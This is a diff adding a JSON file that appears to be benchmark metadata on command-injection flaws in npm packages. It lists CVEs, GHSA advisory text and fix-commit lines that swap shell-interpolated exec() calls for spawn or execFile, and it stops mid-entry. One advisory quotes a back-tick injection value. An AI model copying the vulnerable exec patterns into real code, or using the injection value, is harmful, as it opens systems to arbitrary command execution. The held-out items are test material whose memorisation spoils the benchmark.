@@ -1,0 +1,2618 @@
+{
+  "generated_for": "scope-review-v0",
+  "secbench": [
+    {
+      "group_id": "secbench:apex-publish-static-files",
+      "pair_id": "secbench-apex-publish-static-files-2.0.0",
+      "split": "held_out",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2018-16462",
+      "sink": "index.js:54:25",
+      "source": null,
+      "ghsa_id": "GHSA-9JM3-5835-537M",
+      "ghsa_summary": "Command Injection in apex-publish-static-files",
+      "ghsa_description": "Versions of `apex-publish-static-files` before 2.0.1 are vulnerable to command injection. This is exploitable if user input is passed into the `connectString` option in the `publish` method.\n\n\n## Recommendation\n\nUpdate to version 2.0.1 or later.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/vincentmorneau/apex-publish-static-files/commit/2209af8f2b65c24aa55ab757e0e05b958c16f063",
+        "message": "uses spawn instead of exec",
+        "files": [
+          {
+            "file": "index.js",
+            "hits": [
+              "+const spawnSync = require('child_process').spawnSync;",
+              "+\t\t\t\tconst spawnOpts = [",
+              "+\t\t\t\tconst childProcess = spawnSync(",
+              "+\t\t\t\t\tspawnOpts, {"
+            ]
+          },
+          {
+            "file": "package.json",
+            "hits": [
+              "     \"url\": \"https://github.com/vincentmorneau/apex-publish-static-files/issues\""
+            ]
+          }
+        ],
+        "all_files": [
+          "index.js",
+          "package.json",
+          "test.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:arpping",
+      "pair_id": "secbench-arpping-2.0.0",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "secbench:arpping@2.0.0",
+      "sink": "index.js:120:13",
+      "source": null,
+      "ghsa_id": null,
+      "ghsa_summary": null,
+      "ghsa_description": "",
+      "ghsa_source_code_location": null,
+      "fix": {
+        "url": "https://github.com/haf-decent/arpping/commit/0db06723f8c3c73a5cc0829c667d45cba25ca44d",
+        "message": "use execFile to avoid malicious code injection",
+        "files": [
+          {
+            "file": "index.js",
+            "hits": [
+              "-        exec(`ping ${flag} ${this.timeout} ${ip}`, (err, stdout) => {",
+              "-        exec(`arp ${ip}`, (err, stdout) => {"
+            ]
+          }
+        ],
+        "all_files": [
+          "index.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:async-git",
+      "pair_id": "secbench-async-git-1.13.1",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2020-28490",
+      "sink": "lib/reset/index.js:11:16",
+      "source": null,
+      "ghsa_id": "GHSA-6QPR-9MC5-7GCH",
+      "ghsa_summary": "Command Injection in async-git",
+      "ghsa_description": "The package async-git before 1.13.2 are vulnerable to Command Injection via shell meta-characters (back-ticks). For example: `git.reset('atouch HACKEDb')`",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/omrilotan/async-git/commit/d1950a5021f4e19d92f347614be0d85ce991510d",
+        "message": "Use spawn with git to avoid shell script vulnerabilities (#14)",
+        "files": [
+          {
+            "file": "helpers/spawn/index.js",
+            "hits": [
+              "+const { spawn } = require('child_process');",
+              "+ * Executes git with given arguments string. resolves with the output message",
+              "+\t\tconst git = spawn("
+            ]
+          },
+          {
+            "file": "index.js",
+            "hits": [
+              "+const spawn = require('./helpers/spawn');",
+              "-\t[ 'branch', 'git rev-parse --abbrev-ref HEAD' ],",
+              "-\t[ 'origin', 'git remote get-url origin' ],",
+              "+\t[ 'origin', 'remote get-url origin' ],",
+              "-\t[ 'changed', 'git diff-tree --no-commit-id --name-only -r HEAD' ],",
+              "-\t[ 'staged', 'git diff --name-only --cached' ],",
+              "-\t[ 'tags', 'git tag' ],",
+              "-\t[ 'unstaged', 'git diff --name-only' ],",
+              "-\t[ 'untracked', 'git ls-files -o --exclude-standard' ],",
+              "-\t\tdate: async () => new Date(parseInt(await exec('git show -s --format=%at')) * 1000),",
+              "+\t\tdate: async () => new Date(parseInt(await spawn('show -s --format=%at')) * 1000),",
+              "-\t\tversion: async () => (await exec('git version')).split(' ').pop(),",
+              "+\t\tversion: async () => (await spawn('version')).split(' ').pop(),",
+              "+\t\t([ key, value ]) => ({ [key]: spawn.bind(null, value) }),",
+              "+\t\t([ key, value ]) => ({ [key]: async () => (await spawn(value)).split('\\n') }),",
+              "-\t\t([ key, value ]) => ({ [key]: exec.bind(null, `git show -s --format=%${value}`) }),",
+              "+\t\t([ key, value ]) => ({ [key]: spawn.bind(null, `show -s --format=%${value}`) }),"
+            ]
+          },
+          {
+            "file": "lib/list/index.js",
+            "hits": [
+              "- * List the output lines from command",
+              "-module.exports = async function list(command) {",
+              "-\tconst output = await exec(command);"
+            ]
+          },
+          {
+            "file": "lib/list/spec.js",
+            "hits": [
+              "-\t\tlist = require('.').bind(null, 'some command');",
+              "-\tit('Should call exec with passed command', async() => {",
+              "-\t\texpect(exec).to.have.been.calledWith('some command');"
+            ]
+          },
+          {
+            "file": "lib/modified/index.js",
+            "hits": [
+              "+const spawn = require('../../helpers/spawn');",
+              "  * Create and push a git tag with the last commit message",
+              "-\tconst ts = await exec(`git log -1 --format=\"%at\" -- ${path}`);",
+              "+\tconst ts = await spawn(`log -1 --format=\"%at\" -- ${path}`);"
+            ]
+          },
+          {
+            "file": "lib/remote/index.js",
+            "hits": [
+              "+const spawn = require('../../helpers/spawn');",
+              "-\tconst origin = await exec('git remote get-url origin');",
+              "+\tconst origin = await spawn('remote get-url origin');"
+            ]
+          },
+          {
+            "file": "lib/remote/spec.js",
+            "hits": [
+              "+\tclean('../../helpers/spawn');",
+              "+\t\t\toverride('../../helpers/spawn', () => format);",
+              "+\t\t\t\toverride('../../helpers/spawn', async () => format);"
+            ]
+          },
+          {
+            "file": "lib/reset/index.js",
+            "hits": [
+              "+const spawn = require('../../helpers/spawn');",
+              "-\t\treturn await exec(`git reset ${JSON.stringify(destination)} ${hard ? '--hard' : ''}`);",
+              "+\t\t\tawait spawn(`check-ref-format ${destination}`);",
+              "+\t\treturn await spawn(`reset ${destination} ${hard ? '--hard' : ''}`);",
+              "-\t\treturn await exec(`git reset HEAD~${Math.abs(destination)} ${hard ? '--hard' : ''}`);",
+              "+\t\treturn await spawn(`reset HEAD~${Math.abs(destination)} ${hard ? '--hard' : ''}`);"
+            ]
+          },
+          {
+            "file": "lib/reset/spec.js",
+            "hits": [
+              "+\t\toverride('../../helpers/spawn', exec);",
+              "-\t\texpect(exec.getCall(0).args[0]).to.equal('git reset \"shaid\" --hard');",
+              "-\t\texpect(exec.getCall(0).args[0]).to.equal('git reset HEAD~1 --hard');",
+              "-\t\texpect(exec.getCall(0).args[0]).to.equal('git reset HEAD~3 --hard');",
+              "-\t\texpect(exec.getCall(0).args[0].trim()).to.equal('git reset \"shaid\"');"
+            ]
+          },
+          {
+            "file": "lib/tag/index.js",
+            "hits": [
+              "+const spawn = require('../../helpers/spawn');",
+              "  * Create and push a git tag with the last commit message",
+              "-\t\texec(`git config user.name \"${await author}\"`),",
+              "-\t\texec(`git config user.email \"${await email}\"`),",
+              "+\t\tspawn(`config user.name \"${await author}\"`),",
+              "+\t\tspawn(`config user.email \"${await email}\"`),",
+              "-\tawait exec(`git tag -a ${JSON.stringify(tag)} -m \"${await message}\"`);",
+              "-\tawait exec(`git push origin ${JSON.stringify(`refs/tags/${tag}`)}`);",
+              "+\tawait spawn(`tag -a ${tag} -m \"${await message}\"`);",
+              "+\tawait spawn(`push origin refs/tags/${tag}`);"
+            ]
+          },
+          {
+            "file": "lib/tag/spec.js",
+            "hits": [
+              "+\t\toverride('../../helpers/spawn', (...args) => dummy.stub(...args));",
+              " \t\tdummy.stub = command => lines.push(command);",
+              "-\t\texpect(lines).to.include('git config user.name \"boaty mcboatface\"');",
+              "-\t\texpect(lines).to.include('git config user.email \"boaty@boat.face\"');",
+              " \tit('Should create a git tag with given message and push it', async() => {",
+              " \t\tdummy.stub = command => lines.push(command);",
+              "-\t\texpect(lines).to.include('git tag -a \"1.1.1\" -m \"this is a message\"');",
+              "-\t\texpect(lines).to.include('git push origin \"refs/tags/1.1.1\"');"
+            ]
+          },
+          {
+            "file": "lib/unadded/index.js",
+            "hits": [
+              "+const spawn = require('../../helpers/spawn');",
+              "-\tconst output = await exec('git add --dry-run .');",
+              "+\tconst output = await spawn('add --dry-run .');"
+            ]
+          },
+          {
+            "file": "lib/unadded/spec.js",
+            "hits": [
+              "+\t\toverride('../../helpers/spawn', () => `remove '.gitattributes'"
+            ]
+          },
+          {
+            "file": "package.json",
+            "hits": [
+              "   \"description\": \"👾 Retrieve data from current git repository\","
+            ]
+          },
+          {
+            "file": "spec.js",
+            "hits": [
+              " \t\tgit = require('.');",
+              " \t\tawait exec('echo \"content\" > unadded.txt');",
+              "-\tit('Should call list with relevant git command', async() => {",
+              "-\t\texpect(list).to.have.been.calledWith('git diff-tree --no-commit-id --name-only -r HEAD');",
+              "-\tit('changed should call list with relevant git command', async() => {",
+              "-\t\texpect(list).to.have.been.calledWith('git diff-tree --no-commit-id --name-only -r HEAD');"
+            ]
+          }
+        ],
+        "all_files": [
+          "helpers/spawn/index.js",
+          "index.js",
+          "lib/index.js",
+          "lib/list/index.js",
+          "lib/list/spec.js",
+          "lib/modified/index.js",
+          "lib/remote/index.js",
+          "lib/remote/spec.js",
+          "lib/reset/index.js",
+          "lib/reset/spec.js",
+          "lib/tag/index.js",
+          "lib/tag/spec.js",
+          "lib/unadded/index.js",
+          "lib/unadded/spec.js",
+          "package.json",
+          "spec.js",
+          "vulnerabilities/spec.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:bestzip",
+      "pair_id": "secbench-bestzip-2.1.6",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2020-7730",
+      "sink": "lib/bestzip.js:27:27",
+      "source": null,
+      "ghsa_id": "GHSA-6XV6-JPVW-CX6Q",
+      "ghsa_summary": "Command injection in bestzip",
+      "ghsa_description": "The package bestzip before 2.1.7 are vulnerable to Command Injection via the options param.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/nfriedly/node-bestzip/commit/45d4a901478c6a8f396c8b959dd6cf8fd3f955b6",
+        "message": "prevent shell command injection\n\nswitch from cp.exec to cp.spawn to prevent shell command injection.\n\nUse path-expansion logic from nodeZip in nativeZip to maintain feature parity without any vulnerability.",
+        "files": [
+          {
+            "file": "lib/bestzip.js",
+            "hits": [
+              "-    const command = `zip --quiet --recurse-paths ${",
+              "-    const zipProcess = cp.exec(command, {",
+              "-            `Unexpected exit code from native zip command: ${exitCode}\\n executed command '${command}'\\n executed inin directory '${options.cwd ||",
+              "+    const command = \"zip\";",
+              "+      const zipProcess = cp.spawn(command, args, {",
+              "+              `Unexpected exit code from native zip: ${exitCode}\\n executed command '${command} ${args.join("
+            ]
+          },
+          {
+            "file": "package-lock.json",
+            "hits": [
+              "     \"browser-process-hrtime\": {",
+              "       \"resolved\": \"https://registry.npmjs.org/browser-process-hrtime/-/browser-process-hrtime-1.0.0.tgz\","
+            ]
+          }
+        ],
+        "all_files": [
+          "lib/bestzip.js",
+          "package-lock.json"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:blamer",
+      "pair_id": "secbench-blamer-0.1.13",
+      "split": "reserve",
+      "cwe": "CWE-94",
+      "vulnerability_id": "CVE-2019-10807",
+      "sink": "src/vcs/git.js:24:5",
+      "source": null,
+      "ghsa_id": "GHSA-7VM7-J8P7-H346",
+      "ghsa_summary": "Code injection in blamer",
+      "ghsa_description": "Code injection vulnerability in blamer 1.0.0 and earlier may result in remote code execution when the input can be controlled by an attacker.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/kucherenko/blamer/commit/5fada8c9b6986ecd28942b724fa682e77ce1e11c",
+        "message": "fix(root): Rewrite the project with typescript and fix issue with security of script execution",
+        "files": [
+          {
+            "file": "package.json",
+            "hits": [
+              "-    \"url\": \"https://github.com/kucherenko/blamer.git\"",
+              "+    \"reset\": \"git clean -dfx && git reset --hard && npm i\",",
+              "+    \"doc\": \"Generate HTML API documentation and open it in a browser\","
+            ]
+          },
+          {
+            "file": "src/blamer.ts",
+            "hits": [
+              "+import { git } from './vcs/git';"
+            ]
+          },
+          {
+            "file": "src/vcs/git.js",
+            "hits": [
+              "-    exec('git blame ' + args + ' ' + realFile, {"
+            ]
+          },
+          {
+            "file": "src/vcs/git.spec.ts",
+            "hits": [
+              "+const { git } = proxyquire('./git', {",
+              "+test('should parse git blame command output', async (t: ExecutionContext) => {"
+            ]
+          },
+          {
+            "file": "src/vcs/svn.js",
+            "hits": [
+              "-    exec('svn blame ' + realFile + ' ' + args, {"
+            ]
+          },
+          {
+            "file": "src/vcs/svn.spec.ts",
+            "hits": [
+              "+test('should parse svn blame command', async (t: ExecutionContext) => {"
+            ]
+          },
+          {
+            "file": "test/BlamerSpec.js",
+            "hits": [
+              "-        git = env.stub();",
+              "-    it('should set type git as default vcs', function () {",
+              "-    it('should get data from git with default args', function (){",
+              "-    it('should get data from git with args passed to constructor', function (){",
+              "-    it('should get data from git with args passed to method call', function (){"
+            ]
+          },
+          {
+            "file": "test/vcs/gitSpec.js",
+            "hits": [
+              "-  it('should exec git blame', function() {",
+              "-      'git blame -w ' + file, {",
+              "-  it('should exec git blame with args', function() {",
+              "-      'git blame -M -w ' + file, {",
+              "-  it('should exec git blame without args', function() {",
+              "-      'git blame  ' + file, {"
+            ]
+          }
+        ],
+        "all_files": [
+          ".coveralls.yml",
+          ".github/CONTRIBUTING.md",
+          ".github/ISSUE_TEMPLATE.md",
+          ".github/PULL_REQUEST_TEMPLATE.md",
+          ".gitignore",
+          ".npmignore",
+          ".prettierignore",
+          ".travis.yml",
+          "LICENSE",
+          "package.json",
+          "src/Blamer.js",
+          "src/blame-result.interface.ts",
+          "src/blamer.spec.ts",
+          "src/blamer.ts",
+          "src/index.js",
+          "src/index.ts",
+          "src/vcs/git.js",
+          "src/vcs/git.spec.ts",
+          "src/vcs/git.ts",
+          "src/vcs/svn.js",
+          "src/vcs/svn.spec.ts",
+          "src/vcs/svn.ts",
+          "test/BlamerSpec.js",
+          "test/_bootstrap.js",
+          "test/vcs/gitSpec.js",
+          "test/vcs/svnSpec.js",
+          "tsconfig.json",
+          "tsconfig.module.json",
+          "tslint.json",
+          "yarn.lock"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:clamscan",
+      "pair_id": "secbench-clamscan-1.2.0",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "CVE-2020-7613",
+      "sink": "index.js:495:36",
+      "source": null,
+      "ghsa_id": "GHSA-5v25-xr56-phph",
+      "ghsa_summary": "Clamscan vulnerable to command injection",
+      "ghsa_description": "clamscan through 1.2.0 is vulnerable to Command Injection. It is possible to inject arbitrary commands as part of the `_is_clamav_binary` function located within `Index.js`. It should be noted that this vulnerability requires a pre-requisite that a folder should be created with the same command that will be chained to execute. This lowers the risk of this issue.",
+      "ghsa_source_code_location": "https://github.com/kylefarris/clamscan",
+      "fix": {
+        "url": "https://github.com/kylefarris/clamscan/commit/5f557c970817fe8c578ec3f7ad3bcbcef4cf5538",
+        "message": "Merge pull request #45 from 418sec/master\n\nhuntr.dev - Command Injection Fix",
+        "files": [
+          {
+            "file": "index.js",
+            "hits": [
+              "-            const {stdout} = await cp_exec(version_cmds[scanner]);",
+              "+            version_cmds_exec = version_cmds[scanner].split(' ');",
+              "+            const {stdout} = await cp_execfile(version_cmds_exec[0], [version_cmds_exec[1]]);"
+            ]
+          }
+        ],
+        "all_files": [
+          "index.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:codecov",
+      "pair_id": "secbench-codecov-3.6.4",
+      "split": "development",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2020-15123",
+      "sink": "lib/codecov.js:419:7",
+      "source": null,
+      "ghsa_id": "GHSA-XP63-6VF5-XF3V",
+      "ghsa_summary": "Command injection in codecov (npm package)",
+      "ghsa_description": "### Impact\n\nThe `upload` method has a command injection vulnerability. Clients of the `codecov-node` library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.\n\nA similar CVE was issued: [CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh), but the fix was incomplete. It only blocked `&`, and command injection is still possible using backticks instead to bypass the sanitizer.\n\nWe have written a [CodeQL](https://codeql.com) query, which automatically detects this vulnerability. You can see the results of the query on the `codecov-node` project [here](https://lgtm.com/query/7714424068617023832/).\n\n\n### Patches\nThis has been patched in version 3.7.1\n\n### Workarounds\n\nNone, however, the attack surface is low in this case. Particularly in the standard use of codecov, where the module is used directly in a build pipeline, not built against as a library in another application that may supply malicious input and perform command injection. \n\n### References\n*  [CVE-2020-7597](https://github.com/advisories/GHSA-5q88-cjfq-g2mh)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact us via our [Security Email](mailto:security@codecov.io)",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/codecov/codecov-node/commit/c0711c656686e902af2cd92d6aecc8074de4d83d",
+        "message": "Switch from execSync to execFileSync (#180)\n\n* Switch from execSync to execFileSync\r\n\r\n* Call existsSync instead of executing `if`\r\n\r\n* Trigger a build\r\n\r\n* I think this fixes linux and macos...\r\n\r\n* Only add more_patterns of it has a value. Correct windows.\r\n\r\n* Remove default value to more_patterns, change windows to winPatterns\r\n\r\n* Try a colon.\r\n\r\n* Let's try not using MinGw...\r\n\r\n* What are the chances that Windows has a find?\r\n\r\n* Put it back\r\n\r\n* Reverting Windows side so this can me merged in time if needed.\r\n\r\n* Reverting Windows side so this can me merged in time if needed.\r\n\r\n* Update lib/codecov.js\r\n\r\nCo-authored-by: Guillaume St-Pierre <guillaume@codecov.io>\r\n\r\n* Update lib/codecov.js\r\n\r\nCo-authored-by: Guillaume St-Pierre <guillaume@codecov.io>\r\n\r\n* Set initial values\r\n\r\nCo-authored-by: Guillaume St-Pierre <guillaume@codecov.io>",
+        "files": [
+          {
+            "file": "lib/codecov.js",
+            "hits": [
+              " var urlgrey = require('urlgrey')",
+              "-      execSync('git ls-files || hg locate', { cwd: root })",
+              "       console.log('    Failed to run gcov command.')",
+              "+      // It's not straightforward due to the nature of the find command",
+              "       // It's not straightforward due to the nature of the dir command"
+            ]
+          }
+        ],
+        "all_files": [
+          ".idea/.gitignore",
+          "README.md",
+          "lib/codecov.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:connection-tester",
+      "pair_id": "secbench-connection-tester-0.2.0",
+      "split": "development",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2020-7781",
+      "sink": "index.js:15:28",
+      "source": null,
+      "ghsa_id": "GHSA-W5MP-8P8W-MHH8",
+      "ghsa_summary": "Command injection in connection-tester",
+      "ghsa_description": "This affects the package connection-tester before 0.2.1. The injection point is located in line 15 in index.js. Affected versions of this package are vulnerable to Command Injection",
+      "ghsa_source_code_location": "",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:curling",
+      "pair_id": "secbench-curling-0.2.0",
+      "split": "development",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2019-10789",
+      "sink": "lib/curl-transport.js:56:3",
+      "source": null,
+      "ghsa_id": "GHSA-XMXH-G7WJ-8M4M",
+      "ghsa_summary": "OS Command Injection in curling",
+      "ghsa_description": "npm package `curling` before version 1.1.0 is vulnerable to Command Injection via the run function. The command argument can be controlled by users without any sanitization.",
+      "ghsa_source_code_location": "",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:diskusage-ng",
+      "pair_id": "secbench-diskusage-ng-0.2.6",
+      "split": "development",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2020-7631",
+      "sink": "lib/posix.js:11:5",
+      "source": null,
+      "ghsa_id": "GHSA-3269-X4PW-VFFG",
+      "ghsa_summary": "OS Command Injection in diskusage-ng",
+      "ghsa_description": "diskusage-ng through 0.2.4 is vulnerable to Command Injection.It allows execution of arbitrary commands via the path argument.",
+      "ghsa_source_code_location": "",
+      "fix": {
+        "url": "https://github.com/iximiuz/node-diskusage-ng/commit/48e7e093486b528f0c81ec699573e0e4a431b8d3",
+        "message": "Use execFile instead of exec\n\nTo prevent security risk & improve performance (do not rely on a shell)",
+        "files": [
+          {
+            "file": "lib/posix.js",
+            "hits": [
+              "-    exec('df -k \"' + path + '\"', function(err, stdout) {"
+            ]
+          }
+        ],
+        "all_files": [
+          "lib/posix.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:dns-sync",
+      "pair_id": "secbench-dns-sync-0.1.0",
+      "split": "development",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2014-9682",
+      "sink": "lib/dns-sync.js:21:26",
+      "source": null,
+      "ghsa_id": "GHSA-Q5PQ-PGRV-FH89",
+      "ghsa_summary": "dns-sync command injection vulnerability",
+      "ghsa_description": "The dns-sync module before 0.1.1 for node.js allows context-dependent attackers to execute arbitrary commands via shell metacharacters in the first argument to the resolve API function.",
+      "ghsa_source_code_location": "https://github.com/skoranga/node-dns-sync",
+      "fix": {
+        "url": "https://github.com/skoranga/node-dns-sync/commit/d9abaae384b198db1095735ad9c1c73d7b890a0d",
+        "message": "adding validation check for hostname",
+        "files": [
+          {
+            "file": "lib/dns-sync.js",
+            "hits": [
+              "     shell = require('shelljs'),",
+              "             cmd = util.format('\"%s\" \"%s\" %s', nodeBinary, scriptPath, hostname);"
+            ]
+          }
+        ],
+        "all_files": [
+          "lib/dns-sync.js",
+          "package.json",
+          "test/test.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:extra-asciinema",
+      "pair_id": "secbench-extra-asciinema-1.0.0",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "secbench:extra-asciinema@1.0.0",
+      "sink": "index.js:208:20",
+      "source": null,
+      "ghsa_id": null,
+      "ghsa_summary": null,
+      "ghsa_description": "",
+      "ghsa_source_code_location": null,
+      "fix": {
+        "url": "https://github.com/nodef/extra-asciinema/commit/fd1a8a38d6c72e1eb573b2ab03d5e86de8047480",
+        "message": ":octopus: mr anderson vs agent smith no more fuel injection for cat, rec, upload",
+        "files": [
+          {
+            "file": "src/_recCmd.ts",
+            "hits": [
+              "-function recCmd(f: string, o: any=null): string {",
+              "+function recCmd(f: string, o: any=null): string[] {",
+              "@@ -10,18 +10,18 @@ function recCmd(f: string, o: any=null): string {",
+              "-  var cmd = 'asciinema rec';",
+              "-  if(f) cmd += ` \"${f}\"`;",
+              "-  if(o.stdin) cmd += ' --stdin';",
+              "-  if(o.append) cmd += ' --append';",
+              "-  if(o.raw) cmd += ' --raw';",
+              "-  if(o.overwrite) cmd += ' --overwrite';",
+              "-  if(o.command) cmd += ` -c \"${o.command}\"`;",
+              "-  if(o.env) cmd += ` -e \"${o.env}\"`;",
+              "-  if(o.title) cmd += ` -t \"${o.title}\"`;",
+              "-  if(o.idleTimeLimit) cmd += ` -e \"${o.idleTimeLimit}\"`;",
+              "-  if(o.yes) cmd += ` -e \"${o.yes}\"`;",
+              "-  if(o.quiet) cmd += ` -e \"${o.quiet}\"`;",
+              "-  return cmd;",
+              "+  if(o.command) args.push('--command', o.command);",
+              " export default recCmd;"
+            ]
+          },
+          {
+            "file": "src/cat.ts",
+            "hits": [
+              "-    cp.exec(`asciinema cat ${f}`, {encoding: 'utf8'}, (err, stdout) => {"
+            ]
+          },
+          {
+            "file": "src/rec.ts",
+            "hits": [
+              "-    cp.exec(recCmd(f, o), {encoding: 'utf8'}, (err) => {",
+              "+    cp.execFile('asciinema', recCmd(f, o), {encoding: 'utf8'}, (err) => {"
+            ]
+          },
+          {
+            "file": "src/recSync.ts",
+            "hits": [
+              "-  cp.execSync(recCmd(f, o), {encoding: 'utf8'});",
+              "+  cp.execFileSync('asciinema', recCmd(f, o), {encoding: 'utf8'});"
+            ]
+          },
+          {
+            "file": "src/upload.ts",
+            "hits": [
+              "-    cp.exec(`asciinema upload ${f}`, {encoding: 'utf8'}, (err, stdout) => {"
+            ]
+          },
+          {
+            "file": "src/uploadSync.ts",
+            "hits": [
+              "  * @returns asciicast URL"
+            ]
+          }
+        ],
+        "all_files": [
+          "package-lock.json",
+          "package.json",
+          "src/_recCmd.ts",
+          "src/cat.ts",
+          "src/catSync.ts",
+          "src/rec.ts",
+          "src/recSync.ts",
+          "src/upload.ts",
+          "src/uploadSync.ts"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:get-npm-package-version",
+      "pair_id": "secbench-get-npm-package-version-1.0.6",
+      "split": "development",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2020-7795",
+      "sink": "index.js:16:48",
+      "source": null,
+      "ghsa_id": "GHSA-4h66-vghf-xg5x",
+      "ghsa_summary": "get-npm-package-version Command Injection vulnerability",
+      "ghsa_description": "The package get-npm-package-version before 1.0.7 is vulnerable to Command Injection via the `main` function in index.js.",
+      "ghsa_source_code_location": "https://github.com/hoperyy/get-npm-package-version",
+      "fix": {
+        "url": "https://github.com/hoperyy/get-npm-package-version/commit/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec",
+        "message": "feat: add defence to Command Injection\n\nadd defence to Command Injection",
+        "files": [],
+        "all_files": [
+          "index.js"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:git-parse",
+      "pair_id": "secbench-git-parse-1.0.4",
+      "split": "reserve",
+      "cwe": "CWE-74",
+      "vulnerability_id": "CVE-2021-26543",
+      "sink": "src/git_diff.js:13:3",
+      "source": null,
+      "ghsa_id": "GHSA-m744-2jj8-vpfv",
+      "ghsa_summary": "Command injection in git-parse",
+      "ghsa_description": "The \"gitDiff\" function in Wayfair git-parse <=1.0.4 has a command injection vulnerability. Clients of the git-parse library are unlikely to be aware of this, so they might unwittingly write code that contains a vulnerability.",
+      "ghsa_source_code_location": "https://github.com/wayfair/git-parse",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:giting",
+      "pair_id": "secbench-giting-0.0.7",
+      "split": "held_out",
+      "cwe": "CWE-78",
+      "vulnerability_id": "CVE-2019-10802",
+      "sink": "lib/git.js:223:8",
+      "source": null,
+      "ghsa_id": "GHSA-53XJ-V576-3CH2",
+      "ghsa_summary": "OS Command Injection in giting",
+      "ghsa_description": "giting version prior to 0.0.8 allows execution of arbritary commands. The first argument `repo` of function `pull()` is executed by the package without any validation.",
+      "ghsa_source_code_location": "https://github.com/MangoRaft/git",
+      "fix": {
+        "error": "HTTP Error 404: Not Found"
+      }
+    },
+    {
+      "group_id": "secbench:gm",
+      "pair_id": "secbench-gm-1.20.0",
+      "split": "development",
+      "cwe": "CWE-77",
+      "vulnerability_id": "CVE-2015-7982",
+      "sink": "lib/compare.js:72:5",
+      "source": null,
+      "ghsa_id": "GHSA-PJH3-JV7W-9JPR",
+      "ghsa_summary": "Command Injection in gm",
+      "ghsa_description": "Versions of `gm` prior to 1.21.1 are affected by a command injection vulnerability. The vulnerability is triggered when user input is passed into `gm.compare()`, which fails to sanitize input correctly before calling the graphics magic binary.\n\n\n## Recommendation\n\nUpdate to version 1.21.1 or later.",
+      "ghsa_source_code_location": "https://github.com/aheckmann/gm",
+      "fix": null
+    },
+    {
+      "group_id": "secbench:growl",
+      "pair_id": "secbench-growl-1.9.0",
+      "split": "reserve",
+      "cwe": "cwe_unresolved",
+      "vulnerability_id": "CVE-2017-16042",
+      "sink": "lib/growl.js:289:3",
+      "source": null,
+      "ghsa_id": "GHSA-QH2H-CHJ9-JFFQ",
+      "ghsa_summary": "Growl before 1.10.0 vulnerable to Command Injection",
+      "ghsa_description": "Affected versions of `growl` do not properly sanitize input prior to passing it into a shell command, allowing for arbitrary command execution.\n\n\n## Recommendation\n\nUpdate to version 1.10.0 or later.",
+      "ghsa_source_code_location": "https://github.com/tj/node-growl",
+      "fix": {
+        "url": "https://github.com/tj/node-growl/commit/d71177d5331c9de4658aca62e0ac921f178b0669",
+        "message": "Fix to resolve the command injection vulnerability. (#62)\n\n* fix(lib): fixed command injection vulnerability according to Issue #60\r\n\r\n* Removed unnecessary dependency by using child_process spawn() method",
+        "files": [
+          {
+            "file": "History.md",
+            "hits": [
+              "+  * fixed command injection vulnerability"
+            ]
+          },
+          {
+            "file": "lib/growl.js",
+            "hits": [
+              "+var spawn = require('child_process').spawn",
+              "   , cmd;",
+              "-        args.push(cmd.icon, quote(image));",
+              "+        args.push(cmd.icon, image);",
+              "-        args.push(cmd.icon, quote(image));",
+              "+        args.push(cmd.icon, image);",
+              "-        args.push(cmd.icon + quote(image));",
+              "+        args.push(cmd.icon + image);",
+              "   switch(cmd.type) {",
+              "       args.push(cmd.msg);",
+              "       args.push(cmd.msg);",
+              "         args.push(cmd.title);",
+              "         args.push(cmd.subtitle);",
+              "       if (options.url) {",
+              "         args.push(cmd.url);",
+              "-        args.push(quote(options.url));",
+              "+        args.push(options.url);",
+              "       args.push(cmd.msg);",
+              "       if (cmd.host) {",
+              "         args.push(cmd.host.cmd, cmd.host.hostname)",
+              "         args.push(cmd.msg);",
+              "-      if (options.title) args.push(cmd.title + quote(options.title));",
+              "-      if (options.url) args.push(cmd.url + quote(options.url));",
+              "+      if (options.title) args.push(cmd.title + options.title);",
+              "+      if (options.url) args.push(cmd.url + options.url);",
+              "       args[0] = (function(origCommand) {",
+              "-        var command = origCommand.replace(/(^|[^%])%s/g, '$1' + quote(message));",
+              "-        if (command === origCommand) args.push(quote(message));",
+              "+        var command = origCommand.replace(/(^|[^%])%s/g, '$1' + message);",
+              "+        if (command === origCommand) args.push(message);",
+              "         return command;",
+              "-  exec(args.join(' '), fn);",
+              "+  var cmd_to_exec = args[0];",
+              "+  spawn(cmd_to_exec, args);"
+            ]
+          }
+        ],
+        "all_files": [
+          "History.md",
+          "lib/growl.js",
+          "package.json"
+        ]
+      }
+    },
+    {
+      "group_id": "secbench:gry",
